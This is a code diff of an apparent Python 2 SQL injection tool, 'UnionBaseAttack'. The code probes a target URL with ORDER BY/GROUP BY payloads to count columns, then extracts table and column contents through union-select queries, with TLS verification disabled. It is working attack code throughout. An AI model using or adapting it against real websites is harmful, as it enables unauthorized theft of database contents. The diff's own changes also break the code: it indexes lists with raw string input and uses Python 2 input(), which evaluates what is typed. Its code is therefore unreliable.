@@ -151,12 +151,12 @@ class UnionBaseAttack(object):
             print TextColor.CYELLOW + str(make_table) + TextColor.WHITE + "\n"
 
             while True:
-                table_num = raw_input(TextColor.CBLUE + "~#/Enter table that you want extract([enter exit to return]):" + TextColor.WHITE)
+                table_num = input(TextColor.CBLUE + "~#/Enter table that you want extract([enter exit to return]):" + TextColor.WHITE)
                 if table_num == "exit":
                     break
                 print
 
-                selected_table = table_name[int(table_num)]
+                selected_table = table_name[table_num]
                 #extract column in table_name with convert query
                 column_extracted = list()
                 limit_counter = 0
@@ -180,7 +180,6 @@ class UnionBaseAttack(object):
                             query_ex_table_counter += 1
                         else: 
                             break
-                        #query_ex_table_counter += 1
 
                     lib.sleep(.5)
 
@@ -197,16 +196,21 @@ class UnionBaseAttack(object):
                 query_ex_column_counter = 0
                 limit_counter = 0
                 while True:
-                    column_num = raw_input('~#Enter column that you want to extract[enter exit to go back]: ')
+                    column_num = input('~#Enter column that you want to extract[enter exit to go back]: ')
                     if column_num == "exit":
                         break
                     print
-                    selected_column = column_extracted[int(column_num)]
-                    
+                    selected_column = column_extracted[column_num]
+
                     response = reqs.get(str(string.replace(tuple_var[1],
                             tuple_var[0][0], define_extract_columns_query_php[query_ex_column_counter]%(selected_column))
                             + " FRoM " + selected_table +
                             " limit %d, 1"%(limit_counter) + " %23"), headers=define_headerdata, verify=False)
+
+                    print str(string.replace(tuple_var[1],
+                            tuple_var[0][0], define_extract_columns_query_php[query_ex_column_counter]%(selected_column))
+                            + " FRoM " + selected_table +
+                            " limit %d, 1"%(limit_counter) + " %23")
 
                     if response.content.find("'2134115356'") is not -1:
                         end = re.search("'2134115356'", response.content).end()
@@ -216,16 +220,18 @@ class UnionBaseAttack(object):
                     else:
                         if not data_extracted:
                             query_ex_column_counter += 1
-                        else: break
+                            limit_counter = 0
+                        else:
+                            break
                     lib.sleep(.5)
-                    
-                    counter = 0
-                    make_table = lib.mytable(['Count', 'data'])
-                    for item in data_extracted:
-                        make_table.add_row([str(counter), item])
-                        counter += 1
 
-                    print TextColor.CYELLOW + str(make_table) + TextColor.WHITE + "\n"
+                counter = 0
+                make_table = lib.mytable(['Count', 'data'])
+                for item in data_extracted:
+                    make_table.add_row([str(counter), item])
+                    counter += 1
+                print TextColor.CYELLOW + str(make_table) + TextColor.WHITE + "\n"
+
 
         #start from here
         injection_string_tuple = create_url(columns)
@@ -239,26 +245,19 @@ class UnionBaseAttack(object):
 
     def __order_by_cmd__(self):
         injected_method = ""
-        end_sharp = ""
 
         def item_error_checker(response):
             return_r = False
             for item in define_error_order_by_php:
-                if response.find(item) is not -1 or \
-                        response != self.firstResponse.content:
+                if response.lower().find(item.lower()) is not -1 and response != self.firstResponse.content:
                     return_r = True
             return return_r
 
-        def get_columns_number(method, end_sharp):
+        def get_columns_number(method):
             for counter in xrange(1, 1000):
                 sleep(1)
-                if end_sharp != "":
-                    secondResponse = reqs.get(self.url + method + str(counter),
-                                              headers=define_headerdata, verify=False)
-                else:
-                    secondResponse = reqs.get(self.url + method + str(counter) + " %23",
-                                              headers=define_headerdata, verify=False)
-
+                secondResponse = reqs.get(self.url + method + str(counter) + " %23",
+                                      headers=define_headerdata, verify=False)
                 if secondResponse.content != self.firstResponse.content:
                     return counter - 1
 
@@ -267,17 +266,17 @@ class UnionBaseAttack(object):
             secondResponse = reqs.get(url=self.url + str(item), headers=define_headerdata, verify=False)
             if item_error_checker(secondResponse.content):
                 '''now we can find which command is used for injection'''
-                injected_method = item[0: 10]  # it can be ['order by', 'group by']
-                if item[-1] == "3":
-                    end_sharp = "%23"
+                injected_method = item[0:10]  # it can be ['order by', 'group by']
                 break
 
         print TextColor.CVIOLET + str(
             "\nWorking on count of columns ... please wait untill I found them") + TextColor.WHITE
 
         print
-        columns = get_columns_number(injected_method, end_sharp)
+        columns = get_columns_number(injected_method)
         order_by_string = self.url + injected_method + str(columns)
+        if columns == 0:
+            raise SystemExit, TextColor.RED + "Something is wrong please tell topcodermc@gmail.com" + TextColor.WHITE
         print TextColor.CBEIGE + str("[+] Found => %d columns {%s}"%(columns, order_by_string)) + TextColor.WHITE
         print TextColor.CVIOLET + str("\nNow I testing the union select query ...") + TextColor.WHITE
 
